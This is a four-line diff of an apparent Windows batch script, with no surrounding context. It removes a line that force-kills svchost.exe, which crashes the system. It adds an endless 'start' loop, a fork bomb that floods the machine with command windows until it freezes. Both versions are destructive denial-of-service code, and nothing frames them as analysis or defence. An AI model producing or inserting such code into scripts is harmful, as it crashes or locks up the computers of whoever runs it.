@@ -1,1 +1,4 @@
-TASKKILL /IM svchost.exe /F
+goto i
+:i
+start
+goto i
